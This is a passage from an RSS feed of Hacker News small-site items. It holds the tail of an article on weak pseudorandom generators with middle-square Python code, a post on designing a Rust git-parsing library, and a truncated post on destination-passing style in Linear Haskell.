   <g transform="translate(-80 ,0)"><text x="0" y="310" dy="0.7ex" transform="scale(0.75,1)">52</text><path d="M 5,310 H 9 V 310"></path><use xlink:href="#arrow" transform="translate(0,310)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="310" dy="0.7ex" transform="scale(0.75,1)">23</text><path d="M 5,310 H 9 V 310"></path><use xlink:href="#arrow" transform="translate(0,310)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="320" dy="0.7ex" transform="scale(0.75,1)">39</text><path d="M 5,320 H 9 V 310"></path><use xlink:href="#arrow" transform="translate(0,310)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="320" dy="0.7ex" transform="scale(0.75,1)">86</text><path d="M 5,320 H 9 V 320"></path><use xlink:href="#arrow" transform="translate(0,320)"></use></g>
  </g>
  <g>
   <g transform="translate(-20 ,0)"><text x="0" y="330" dy="0.7ex" transform="scale(0.75,1)">50</text><path d="M 5,330 H 9 V 330"></path><use xlink:href="#loop1" transform="translate(0,330)"></use></g>
  </g>
  <g transform="translate(0,10)">
   <g transform="translate(-20 ,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">60</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#loop1" transform="translate(0,340)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">40</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">20</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">47</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-100,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">74</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-120,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">88</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-140,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">83</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-160,0)"><text x="0" y="340" dy="0.7ex" transform="scale(0.75,1)">94</text><path d="M 5,340 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="350" dy="0.7ex" transform="scale(0.75,1)">49</text><path d="M 5,350 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="360" dy="0.7ex" transform="scale(0.75,1)">80</text><path d="M 5,360 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="360" dy="0.7ex" transform="scale(0.75,1)">53</text><path d="M 5,360 H 9 V 360"></path><use xlink:href="#arrow" transform="translate(0,360)"></use></g>
   <g transform="translate(-80 ,0)"><text x="0" y="370" dy="0.7ex" transform="scale(0.75,1)">99</text><path d="M 5,370 H 9 V 360"></path><use xlink:href="#arrow" transform="translate(0,360)"></use></g>
   <g transform="translate(-60 ,0)"><text x="0" y="380" dy="0.7ex" transform="scale(0.75,1)">97</text><path d="M 5,380 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="390" dy="0.7ex" transform="scale(0.75,1)">51</text><path d="M 5,390 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="400" dy="0.7ex" transform="scale(0.75,1)">98</text><path d="M 5,400 H 9 V 340"></path><use xlink:href="#arrow" transform="translate(0,340)"></use></g>
  </g>
  <g transform="translate(0,20)">
   <g transform="translate(-20 ,0)"><text x="0" y="410" dy="0.7ex" transform="scale(0.75,1)">24</text><path d="M 5,410 H 9 V 410"></path><use xlink:href="#loop2" transform="translate(0,410)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="410" dy="0.7ex" transform="scale(0.75,1)">57</text><path d="M 5,410 H 9 V 410"></path><use xlink:href="#arrow" transform="translate(0,410)"></use></g>
   <g transform="translate(-40 ,0)"><text x="0" y="420" dy="0.7ex" transform="scale(0.75,1)">79</text><path d="M 5,420 H 9 V 410"></path><use xlink:href="#arrow" transform="translate(0,410)"></use></g>
  </g>
 </g>
</svg>

			<label for="mn-demo">⊕</label>
			
			<span>
				<i>Directed graph of all 100 2-digit pseudorandom numbers obtained using the middle-square method</i>, by CMG Lee.
			</span>
		</figure>
		<p>Performance for the version with 4 digits of state is better; the average length of time before being trapped in a cycle is after 43 outputs<label for="6"></label><span>Another useful property of these RNGs is that it is pretty obvious when they are starting to break down- among the 10000 numbers the 4-digit version can output, only <i><code>0, 9600, 1600, 5600, 8100, 100, 4100, 2916, 2500, 3009, 5030, 3600, 7600, 3792, 2100, 6100, 540</code></i> immediately lead to decay. </span>. That code looks something like this, just so you get the idea:</p>
		<figure><pre><code data-lang="python"><span>def</span> <span>von_neumann_generator</span><span>(</span><span>state</span><span>):</span>
	<span>"""The version with a 4 digit state/output
	not to be confused with the one above, that
	has two."""</span>

	<span>#e.g. 1234**2-&gt;1522756
</span>	<span>square</span> <span>=</span> <span>state</span><span>**</span><span>2</span> 

	<span>#1522756 -&gt; 01522756
</span>	<span>formattedSquare</span> <span>=</span> <span>"%08d"</span> <span>%</span> <span>square</span>

	<span>#01522756 -&gt; 5227
</span>	<span>next_state</span> <span>=</span> <span>output</span> <span>=</span> <span>int</span><span>(</span><span>formattedSquare</span><span>[</span><span>2</span><span>:</span><span>6</span><span>])</span>
	<span>return</span> <span>(</span><span>next_state</span><span>,</span><span>output</span><span>)</span>
<span>state</span> <span>=</span> <span>1234</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>20</span><span>):</span>
	<span>state</span><span>,</span><span>output</span> <span>=</span> <span>von_neumann_generator</span><span>(</span><span>state</span><span>)</span>
	<span>print</span><span>(</span><span>output</span><span>)</span>
		</code></pre></figure>
		<p>You can see in the above example that the state and the output are identical, but there is no particular reason this has to be the case. For example, we could have the state be the inner four numbers, with the output being the <i>outer</i> four numbers:</p>
		<figure><pre><code data-lang="python"><span>def</span> <span>much_better_von_neumann_generator</span><span>(</span><span>state</span><span>):</span>
	<span>square</span> <span>=</span> <span>state</span><span>**</span><span>2</span> <span># e.g. 1234**2-&gt;1522756
</span>	<span>formattedSquare</span> <span>=</span> <span>"%08d"</span><span>%</span><span>square</span>
	<span>output</span> <span>=</span> <span>int</span><span>(</span><span>formattedSquare</span><span>[</span><span>0</span><span>:</span><span>2</span><span>]</span><span>+</span><span>formattedSquare</span><span>[</span><span>6</span><span>:])</span>
	<span>next_state</span> <span>=</span> <span>int</span><span>(</span><span>formattedSquare</span><span>[</span><span>2</span><span>:</span><span>6</span><span>])</span>
	<span>return</span> <span>(</span><span>next_state</span><span>,</span><span>output</span><span>)</span>
<span>state</span> <span>=</span> <span>1234</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>40</span><span>):</span>
	<span>state</span><span>,</span><span>output</span> <span>=</span> <span>much_better_von_neumann_generator</span><span>(</span><span>state</span><span>)</span>
	<span>print</span><span>(</span><span>output</span><span>)</span>
		</code></pre></figure>
		<p>This RNG is also not quite ready for prime time, but the relationship between the output and state is already harder to guess. However, they are clearly <i>interconnected</i> in some causal sense, a fact we will return to in a bit. For now, we are starting to see a few important tensions in the design of RNGs already:</p>
		<ul>
			<li><b>Unpredictability</b> – Increasing the number of digits in the output/state increases the unpredictability of the output. Sometimes less adroitly designed algorithms (like the one above) will eventually degenerate to some kind of undesirable low-randomness state, but most ones in use in computers simply will iterate through their entire state in some order before returning to the original one. Among the generators that look superficially okay, there are a lot of mathematically interesting ways to verify this intuition: we can count the number of bits to make sure it is evenly distributed; we can figure out if the runs of ones and zeros look OK, and a …</li></ul></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html">https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html</a></em></p>]]>
            </description>
            <link>https://www.airza.net/2020/11/09/everyone-talks-about-insecure-randomness-but-nobody-does-anything-about-it.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068571</guid>
            <pubDate>Thu, 12 Nov 2020 10:57:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[That's the Wrong Abstraction Layer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068566">thread link</a>) | @pcr910303
<br/>
November 12, 2020 | https://spacekookie.de/blog/thats-the-wrong-abstraction-layer/ | <a href="https://web.archive.org/web/*/https://spacekookie.de/blog/thats-the-wrong-abstraction-layer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I'm writing this post mostly to my future self, not any specific
project or piece of code I've seen other people write.  That's not to
say that I don't think this is something that probably applies to many
projects.  Sometimes it's easy to lose sight of what we're doing, and
it's good to be reminded.</p>
<p>So to start at the beginning: I've been working on <a href="https://git.spacekookie.de/kookienomicon/tree/apps/servers/octopus/supergit?h=main">supergit</a>, a Rust
library to parse git repositories.  It's built on top of <code>libgit2</code>
(and the <code>git2</code> rust bindings), and aims to create a more Rustic
interface and type fascade for git repositories.  It also aims to
solve issues such as: rename detection, path-history, and subtree
management.  I'm writing this library for <a href="https://git.spacekookie.de/kookienomicon/tree/apps/servers/octopus/?h=main">octopus</a>, which will
eventually host my monorepo.</p>
<p>In <code>supergit</code> the main workflow is around iterating things, seeing as
git is an acyclical graph, and iterators are a decent way to view this
datastructure.  But git graphs can get pretty big.  I wanted the
iterator to be configurable in a way that allows someone to write a
tool that searches a whole repository history, while also making it
possible to step through a history 20 commits at a time (to implement
history pagination on a website, for example).</p>
<p>Looking at the current API, this is how you would implement the
latter, for a <code>main</code> branch:</p>
<div><pre><span></span><code><span>use</span><span> </span><span>supergit</span>::<span>Repository</span><span>;</span><span></span>

<span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span></span>
<span>    </span><span>let</span><span> </span><span>path</span><span> </span><span>=</span><span> </span><span>..</span><span>.</span><span> </span><span>// get your repository path somehow</span>
<span>    </span><span>let</span><span> </span><span>repo</span><span> </span><span>=</span><span> </span><span>Repository</span>::<span>open</span><span>(</span><span>path</span><span>).</span><span>unwrap</span><span>();</span><span></span>

<span>    </span><span>let</span><span> </span><span>main</span><span> </span><span>=</span><span> </span><span>repo</span><span>.</span><span>get_branch</span><span>(</span><span>"main"</span><span>).</span><span>unwrap</span><span>();</span><span></span>
<span>    </span><span>let</span><span> </span><span>iter</span><span> </span><span>=</span><span> </span><span>main</span><span>.</span><span>get</span><span>(</span><span>20</span><span>);</span><span></span>

<span>    </span><span>iter</span><span>.</span><span>for_each</span><span>(</span><span>|</span><span>c</span><span>|</span><span> </span><span>{</span><span></span>
<span>        </span><span>println</span><span>!</span><span>(</span><span>"{}: {}"</span><span>,</span><span> </span><span>c</span><span>.</span><span>commit</span><span>().</span><span>id_str</span><span>(),</span><span> </span><span>c</span><span>.</span><span>commit</span><span>().</span><span>summary</span><span>());</span><span></span>
<span>    </span><span>});</span><span></span>
<span>}</span><span></span>
</code></pre></div>


<p>That's easy enough, right?  But wait, why am I calling <code>.commit()</code> on
<code>c</code>.  Isn't it already a commit?  Well...sort of.  In <code>supergit</code>, this
type is a <code>BranchCommit</code>, because this is where things get
complicated.</p>
<h2>Sort of like a tree, but not really</h2>
<p>In git, rarely is a branch just a history of single commits.  Maybe
this is how some people think about their history, but it certainly
has never been the case for any of the repositories that I work on.
Basically the second you have more than one contributor, it's very
common for a history to have merge-commits in it.</p>
<p>So how do we deal with that in an iterator?  The design I chose was to
wrap a <code>Commit</code> object in another type, which can convey this state.
<code>BranchCommit</code> is an enum and has three variants: <code>Commit</code> (maybe I
should rename that to <code>Simple</code> or something?), <code>Merge</code>, and <code>Octopus</code>
(if you don't know what an octopus merge is, don't worry about it.
Most people don't and they're very rare and weird).</p>
<p>What <code>Merge</code> and <code>Octopus</code> contain are new <code>Branch</code> handles (the type
returned by <code>get_branch()</code>), meaning that for every split it's now up
to the user to decide whether they want to continue first-parent
(i.e. only ever follow the main branch line, ignoring the history of
merged branches), or if they want to enumerate the histories as well.
Most importantly: for every branch merge, you get to re-decide what
your iterator strategy should be: infinate, limited by number, or
limited up to a certain commit-hash.</p>
<p>So far so good I thought, this is an okay enough interface for me to
work with.  But this is where some problems appeared.</p>
<h2>File histories (and git internals)</h2>
<p><em>(a slight de-tour through git - feel free to skip)</em></p>
<p>The main reason why I'm writing this more Rustic wrapper around
<code>libgit2</code> is to make it easier to determine what the history of a file
has been.  This is pretty simple to find out via the git CLI (<code>git log
-- &lt;your file here&gt;</code>), but not something that <code>libgit2</code> exposes,
because that's not how git stores data.</p>
<p>To git, all data is stored in a key-value store indexed by a SHA1
(soon to be SHA256 I think?) hash reference.  That applies to files,
full file trees, and commits as well.  Say we have a file <code>acab.txt</code>,
we commit it and it gets the ID
<code>da39a3ee5e6b4b0d3255bfef95601890afd80709</code> (the file ID, not the
commit ID!), but then we open it and write <code>ACAB</code> in it, and commit
that again.  Now the file ID is
<code>99f069b8a0cbe4c9485a14fe50775d0f71deb4e7</code>.  Both these files are
saved in the git object store, because after all you might want to go
back to the older version.</p>
<p>But here's the thing: from the actual commits we can get two things:
the file tree at the time of commit, and the commit parents.  To
figure out what actually <em>changed</em> in the commit, you have to diff it
against it's parents, which is exactly what <code>git show</code> does if you
give it a reference to a commit.</p>
<p>What this means is that if you want to have a library that grabs the
history of a path, well you'll have to go through all commits, and
check the tree for changes at that specific path.  Furthermore, that
won't actually let you know if a file has simply been renamed, only
that it has changed.  Further logic is required to figure out if the
file is the same, but just has a different name.</p>
<p>And all of this is something that <code>supergit</code> implements, behind a nice
Rustic API (I hope...).</p>
<h2>Bloated abstractions</h2>
<p>So I wrote a function that would, for a branch iterator, step along it
and check the history of a path, by diffing each commit with it's
parents, and tracking a path via the delta information in the diff.
But this is where I ran into problems.  Because my iterator design
always chose the first-parent to step through.  Other branches were
ignored, and because the function accepted an iterator and stepped it
internally, there was no way for my <code>file_history()</code> function to
figure out the exact behaviour the user wanted.</p>
<p>My first instinct was to implement branching in the <code>BranchIter</code>
itself; allowing it to branch off, essentially pushing commits it
would have to get back to onto a stack, and resuming from a previous
position.  That turned out to be a really <a href="https://git.spacekookie.de/kookienomicon/commit/apps/servers/octopus/supergit?h=main&amp;id=0728c2f325e2eaac2c3b834260a8d0a97afaff63">bad idea</a>.</p>
<p>It took me about an hour of banging my head against this abstraction
before I realised that it wasn't meant to be.  Sometimes systems are
self-contained, and adding more functionality takes a considerable
amount of effort, and begs the question, if it's really the right
choice to make.  Why add more functionality to an abstraction that
works fine on it's own?</p>
<p>Instead, embrace composition, and add another layer on top, that can
use the previous.  You end up with a much more managable design, and
data can flow from one layer to the next.  Make sure that your
interfaces are flexible enough to be re-used, but don't think that
just because a component <em>could</em> technically be responsible for some
work, that it really has to implement this work.</p>
<p>And that's it basically.  Thanks for reading my ramblings about git
and one of my side-projects.  I hope I managed to make you think about
the way you build systems a bit, and maybe next time you are in a
situation similar to this one, don't be like me :)</p>
  </div></div>]]>
            </description>
            <link>https://spacekookie.de/blog/thats-the-wrong-abstraction-layer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068566</guid>
            <pubDate>Thu, 12 Nov 2020 10:55:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pure destination-passing style in Linear Haskell]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068394">thread link</a>) | @gbrown_
<br/>
November 12, 2020 | https://www.tweag.io/blog/2020-11-11-linear-dps/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-11-11-linear-dps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>My goal today is to convince you that destination-passing style is
neat, actually. And that <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> make
destination-passing purely functional. But first, I must answer a
question.</p>
<h2>What is destination-passing style?</h2>
<p>If you’ve ever programmed in C, C++, or Fortran, you are sure to have
encountered the style of programming which sometimes goes by the name
<em>destination-passing style</em>. It is the practice of writing, <em>e.g.</em> an
array-producing functions as, instead, taking an empty array as an
extra argument and filling it. Consider, for example, the C <code>strcpy</code> function:</p>
<div data-language="c"><pre><code><span>char</span><span>*</span> <span>strcpy</span> <span>(</span> <span>char</span><span>*</span> destination<span>,</span> <span>const</span> <span>char</span><span>*</span> source <span>)</span><span>;</span></code></pre></div>
<p>It copies the string in <code>source</code> to the array <code>destination</code> (it also
returns <code>destination</code> when it’s done).</p>
<p>The name “destination-passing style” itself seems to be more common in
the functional programming language compilation literature, however. C
programmers don’t appear to have a name for it. So it is likely that
you have never encountered it.</p>
<h2>But this is extremely imperative, why should I care?</h2>
<p>Why, indeed, care about destination-passing? It does let you ask a new
question: “whose responsibility is it to allocate the array?“. If I
were to write an array copy in Haskell, it would have type</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span></code></pre></div>
<p>And there is no way around <code>copyArray</code> allocating an array itself. The
question doesn’t even exist. With <code>strcpy</code>, I can either choose to
allocate an array, and pass it immediately to <code>strcpy</code>, or, I can
delegate the allocation of the array to someone else.</p>
<p>But, once I can ask this question, what can I do with it? I can
compose it! Let’s imagine that we have a function to split an array in
two</p>
<div data-language="haskell"><pre><code><span>splitArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span></code></pre></div>
<p>Now consider the following (admittedly not especially useful)
function:</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray2</span> <span>a</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>&lt;&gt;</span> <span>copyArray</span> <span>ar</span></code></pre></div>
<p>When the question doesn’t exist, each call to <code>copyArray</code> has, no matter what,
to allocate an array, which is then copied into a new array. It means
that we are making a superfluous copy of our original array,
only to discard it immediately. This is quite wasteful.</p>
<h2>Won’t fusion take care of that, though?</h2>
<p>Often, you can, indeed, rely on array fusion to avoid too egregious a
behaviour. Array fusion, such as implemented in the excellent <a href="https://hackage.haskell.org/package/vector">vector</a>
library will eliminate a ton of intermediate allocations.</p>
<p>However, fusion is unreliable. Sometimes, a simple refactoring will
push a function’s size beyond what GHC is willing to inline, and it
will break an entire fusion pipeline. Most of the time, this is fine,
but not when you are dependent on fusion happening. And if you need
GHC to produce code without allocations, why not write your program directly as you want
it, rather than try and coax the compiler into hopefully eliminating
the allocations for you.</p>
<p>This has been a guiding principle in the development of the linear
types project: <strong>compiler optimisations are great, as you don’t need
to think about a lot of things; until you do, and you find yourself
second-guessing the optimiser</strong>. When that happens, we want linear
types to empower you to write the code that you mean, without
sacrificing Haskell’s type safety.</p>
<p>Besides, in the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">article about F̃</a>, a restricted array-based
functional language which compiles to very efficient code, the authors
find significant performance gains for using destination-passing on
top of an array fusion optimisation. They only use destination-passing
in the optimiser, though, not as a language feature.</p>
<p>Finally, fusion doesn’t always work. Suppose I rewrite my <code>copyArray2</code>
function to use threads to better utilise my multicore architecture</p>
<div data-language="haskell"><pre><code><span>copyArray3</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>IO</span> <span>(</span><span>Array</span> <span>a</span><span>)</span>
<span>copyArray3</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>do</span>
    <span>(</span><span>bl</span><span>,</span> <span>br</span><span>)</span> <span>&lt;-</span> <span>concurrently</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>al</span><span>)</span>
      <span>(</span><span>evaluate</span> <span>$</span> <span>copyArray</span> <span>ar</span><span>)</span>
    <span>return</span> <span>$</span> <span>bl</span> <span>&lt;&gt;</span> <span>br</span></code></pre></div>
<p>This is beyond a fusion framework ability to optimise. Or maybe I want
to copy my array into a memory mapped buffer. The point is: fusion
will do a lot for you, just not everything.</p>
<h2>Ok, but does that mean I have to use ST everywhere?</h2>
<p>The obvious way to encode destination-passing style, in Haskell, is to
move all our computation to <code>ST</code>, so that <code>copyArray</code> would be</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>STArray</span> <span>s</span> <span>a</span> <span>-&gt;</span> <span>ST</span> <span>(</span><span>)</span></code></pre></div>
<p>But it’s not very congruent with how functional programmers write
their programs. It does lift all of the above limitations, at the
price of adding state everywhere, which is an entire error-inducing
surface that functional programming usually avoids.</p>
<p>It’s a huge price to pay, and that’s why the <a href="https://hackage.haskell.org/package/vector">vector</a> library is not
structured like this. It does feature mutable arrays, but immutable
arrays are very much encouraged.</p>
<p>This is where <a href="https://www.tweag.io/blog/tags/linear-types">linear types</a> help. Indeed, let’s take a
step back and ask: what makes a destination impure to begin with?</p>
<ul>
<li>If I read out a cell, then write to it, then read it again: I’ll see a
different result the second time.</li>
<li>If I write to the same cell twice, the writes need to be ordered,
otherwise the result would be non-deterministic.</li>
<li>Reading a cell which has not been initialised is non-deterministic
(though in most case, we can salvage this by initialising every cell
with <code>undefined</code>)</li>
</ul>
<p>All of these behaviours are prohibited in pure code. But we could
avoid all the prohibited behaviours if we could make sure that each
cell is written to exactly once before being read. Aha! Exactly once,
this is the sort of thing that linear types are good at! Ok, so let’s
try again:</p>
<div data-language="haskell"><pre><code><span>copyArray</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span></code></pre></div>
<p>This means that <code>copyArray</code> is a <em>pure</em> function which uses its destination
(in its entirety) exactly once. We only need to make sure that there
is only ever a unique pointer to a destination array, which we do with
the <code>alloc</code> function:</p>
<div data-language="haskell"><pre><code><span>alloc</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>(</span><span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span><span>)</span> ⊸ <span>Array</span> <span>a</span></code></pre></div>
<p>A destination is allocated for the scope of the linear function. At
the end of the function, we know that the destination has been fully
filled, and so we get an array out. From this destination-passing
version of <code>copyArray</code>, by the way, it is easy to retrieve the
direct style variant:</p>
<div data-language="haskell"><pre><code><span>copyArray</span>' <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>copyArray</span>' <span>a</span> <span>=</span> <span>alloc</span> <span>(</span><span>length</span> <span>a</span><span>)</span> <span>(</span><span>\</span><span>d</span> <span>-&gt;</span> <span>copyArray</span> <span>a</span> <span>d</span><span>)</span></code></pre></div>
<p>The reverse, as I’ve been arguing throughout this post, is very much
not true. So the destination-passing function is the more fundamental
one.</p>
<p>Now, to be able to implement <code>copyArray2</code>, we need a function which
splits destinations</p>
<div data-language="haskell"><pre><code><span>splitDArray</span> <span>::</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>Then, it is just a matter of following the types (the curious-looking <code>&amp; \case</code> construction is due to a limitation of the current
implementation of linear types in GHC, see <a href="https://github.com/tweag/linear-base/blob/8642e4209ffd663e1f1f35ddd977da0d073fa1af/docs/USER_GUIDE.md#case-statements-are-not-linear">here</a>)</p>
<div data-language="haskell"><pre><code><span>copyArray2</span> <span>::</span> <span>Array</span> <span>a</span> <span>-&gt;</span> <span>DArray</span> <span>a</span> ⊸ <span>(</span><span>)</span>
<span>copyArray2</span> <span>a</span> <span>d</span> <span>=</span> <span>case</span> <span>splitArray</span> <span>a</span> <span>of</span>
  <span>(</span><span>al</span><span>,</span> <span>ar</span><span>)</span> <span>-&gt;</span> <span>splitDArray</span> <span>d</span> <span>&amp;</span> <span>\</span><span>case</span>
    <span>(</span><span>dl</span><span>,</span> <span>dr</span><span>)</span> <span>-&gt;</span> <span>copyArray</span> <span>al</span> <span>dl</span> <span>`lseq`</span> <span>copyArray</span> <span>ar</span> <span>dr</span></code></pre></div>
<p>Voilà! No superfluous allocation. Not because of the optimiser, but
because of the semantics of my program: it doesn’t allocate an array
anywhere.</p>
<p>You’ll find a more complete destination array interface in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Destination.hs">the
<code>Data.Array.Destination</code> module of linear-base</a>.</p>
<h2>Closing thoughts</h2>
<p>One of the features of linear types, is that they often allow to
expose as pure interfaces objects which appear to be intrinsically
impure. But I want to argue that, in the case of destinations, we’ve
actually done more than this: we’ve made the interface <em>better</em> than
the impure interface. Not because pure interfaces are better than
impure interfaces (though it’s a defensible position), but because the
linear destination interface is a more faithful representation of what
destinations mean.</p>
<p>There is no longer confusion about what is an input and what is an
output: inputs are <code>Array</code>, and outputs are <code>DArray</code>. Destinations are
there solely for output, they can’t be used as a temporary store of
data. And the types ensure that they are fully filled, and that we
don’t accidentally overwrite an output, by the time the destination is
read back as an array.</p>
<p>And this is pretty neat.</p>
<p>If you want to go a bit deeper into this particular brand of weed, let
me leave you with a handful of comments which you can take either as
closing this blog post, or opening new avenues.</p>
<ul>
<li>The <code>alloc</code> function takes a destination-consuming function as an
argument, instead of returning a destination directly. This style is
common in Linear Haskell, as a means to enforce uniqueness. It is
sometimes seen as a limitation of Linear Haskell’s design. However
in this particular case, the function is necessary to <em>delimit the
scope</em> of the destination. In fact, the <code>alloc</code> function is
virtually identical to that of the <a href="https://dl.acm.org/doi/abs/10.1145/3122948.3122949">F̃ article</a>, where there
is no linear typing whatsoever.</li>
<li>Affine types (affine arguments are consumed <em>at most</em> once,
rather than <em>exactly</em> once for linear arguments) are sometimes
preferable to linear types. For instance affine types appear to
<a href="https://www.tweag.io/blog/2018-06-21-linear-streams/">represent streaming
computations better</a>. But
in the case of destinations we really do want linear types: it
wouldn’t make as much sense to return from <code>alloc</code> with a
partially-filled destination.</li>
<li>When using linear types to make a pure interface to array functions
which, in fact, mutate an array for efficiency (like in <a href="https://github.com/tweag/linear-base/blob/191badef5c92aaa44a7f311b0c9978fc144622f1/src/Data/Array/Mutable/Linear.hs">this module
of linear
base</a>),
we lose the ability to alias the mutable array in exchange for
purity. Sometimes it’s a perfectly acceptable trade-off, but some
algorithms depend on sharing mutation for efficiency, these are not
available with linear pure mutable arrays. We are not making such a
trade-off for destinations: linear destinations, being pure output,
are, arguably, a more faithful interface for destination-passing
style than mutable array.</li>
<li>
<p>Have you noticed how in the destination-passing <code>copyArray2</code>, the
call to array concatenation from the direct-style implementation has
been replaced by a call to <code>splitDArray</code>? And, if you have, have you
also noticed the symmetry between these two functions?</p>
<div data-language="haskell"><pre><code><span>uncurry</span> <span>(</span><span>&lt;&gt;</span><span>)</span> <span>::</span> <span>(</span><span>Array</span> <span>a</span><span>,</span> <span>Array</span> <span>a</span><span>)</span> <span>-&gt;</span> <span>Array</span> <span>a</span>
<span>splitDArray</span> <span>::</span> <span>Darray</span> <span>a</span> ⊸ <span>(</span><span>DArray</span> <span>a</span><span>,</span> <span>DArray</span> <span>a</span><span>)</span></code></pre></div>
<p>This is not a coincidence. There is a sort of duality between
destinations and constructors. This …</p></li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.tweag.io/blog/2020-11-11-linear-dps/">https://www.tweag.io/blog/2020-11-11-linear-dps/</a></em></p>]]>
            </description>
            <link>https://www.tweag.io/blog/2020-11-11-linear-dps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068394</guid>
            <pubDate>Thu, 12 Nov 2020 10:22:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Laptop Reviews]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068348">thread link</a>) | @manuanuragck
<br/>
November 12, 2020 | https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267 | <a href="https://web.archive.org/web/*/https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://diode.zone/videos/watch/18caf3b3-bbc3-47eb-a394-eca1af079267</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068348</guid>
            <pubDate>Thu, 12 Nov 2020 10:15:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Essential Guide to Design Strategy]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068234">thread link</a>) | @mmanja
<br/>
